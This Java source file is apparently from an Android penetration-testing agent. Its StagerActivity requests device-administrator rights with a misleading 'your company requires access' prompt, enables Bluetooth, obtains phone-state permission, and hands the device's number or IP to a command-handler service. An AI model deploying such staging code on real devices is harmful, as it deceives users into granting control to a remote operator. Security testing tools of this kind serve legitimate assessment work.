package com.shevirah.androidagent;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.Manifest;
import android.support.v4.app.ActivityCompat;
import static android.text.TextUtils.isEmpty;
import static com.shevirah.androidagent.CommandHandlerService.GETS;
import static com.shevirah.androidagent.Util.getIPAddress;
import android.content.pm.PackageManager;
import android.bluetooth.BluetoothAdapter;

public class StagerActivity extends Activity {
    private static final String TAG = "StagerActivity";
    static final int ACTIVATION_REQUEST = 47;
    static final int REQUEST_ENABLE_BT = 48;
    public static final String SPLITTER = " ";
    public static final String GETS = "GETS";
    public static final String ATTA = "ATTA";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Const.DEBUG) Log.d(TAG, "onCreate()");
        Intent intent2 = this.getIntent();
        String body = intent2.getStringExtra("command");
        String messageParts[] = body.split(SPLITTER);
        if (Const.DEBUG) Log.d(TAG, "Started command handler with argument message=[" + body + "]");

        if (messageParts.length < 2) {
            throw new IllegalArgumentException("Message does not have proper format " + body);
        }

        String function = messageParts[1];
        if (function.equals(GETS)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            ComponentName componentName = new ComponentName(this, AdminReceiver.class);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Your company requires access to ensure proper security on your device");
            startActivityForResult(intent, ACTIVATION_REQUEST);
        }
	else if (function.equals("EBLU"))
        {
                Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
                startActivityForResult(enableBtIntent, REQUEST_ENABLE_BT);
        }
        else if (function.equals(ATTA))
        {
           requestPermissions(
                   new String[]{Manifest.permission.READ_PHONE_STATE},
                   1);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case ACTIVATION_REQUEST:
                if (resultCode == Activity.RESULT_OK) {
                    if (Const.DEBUG) Log.i(TAG, "Administration enabled!");
                    startCommandHandlerService();
                } else {
                    if (Const.DEBUG) Log.i(TAG, "Administration enable FAILED!");
                }
        
	case REQUEST_ENABLE_BT:
                if (resultCode == Activity.RESULT_OK) {
                        if (Const.DEBUG) Log.i(TAG, "Bluetooth enabled!");
                        bluetoothSetupDone();
                } else {
                         if (Const.DEBUG) Log.i(TAG, "Bluetooth enable FAILED!");
                }
	}
        finish();
    }

    private void startCommandHandlerService() {
        String number = getPhoneNumberOrIP(this);
        String messageArgs = String.format("%s-%s %s", getString(R.string.agentkey), number, GETS);

        Intent intent = new Intent(getApplicationContext(), CommandHandlerService.class);
        intent.putExtra(CommandHandlerService.EXTRA_MESSAGE, messageArgs);
        startService(intent);
    }

    public static String getPhoneNumberOrIP(Context context) {

        String number = PhoneHelper.getPhoneNumber(context);

        if (isEmpty(number)) {
            number = getIPAddress(true);
        } else if (doesBeginWithPlus(number)) {
            number = number.substring(1);
        }
        return number;
    }
    private void bluetoothSetupDone() {
         String number = getPhoneNumberOrIP(this);
        String messageArgs = String.format("%s-%s %s", getString(R.string.agentkey), number, "EBLU");

        Intent intent = new Intent(getApplicationContext(), CommandHandlerService.class);
        intent.putExtra(CommandHandlerService.EXTRA_MESSAGE, messageArgs);
        startService(intent);
   }
    private static boolean doesBeginWithPlus(String number) {
        return number.length() > 0 && number.substring(0, 1).equals("+");
    }
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {
        switch (requestCode) {
            case 1: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    String command = getString(R.string.agentkey) + " " + CommandHandlerService.ATTACH + " WEB";
                    startCommandService(command);


                }

            }

            // other 'case' lines to check for other
            // permissions this app might request
        }
        finish();
    }
    private void startCommandService(String body) {
        Intent intent = new Intent(this, CommandHandlerService.class);
        intent.putExtra(CommandHandlerService.EXTRA_MESSAGE, body);
        startService(intent);
    }
}
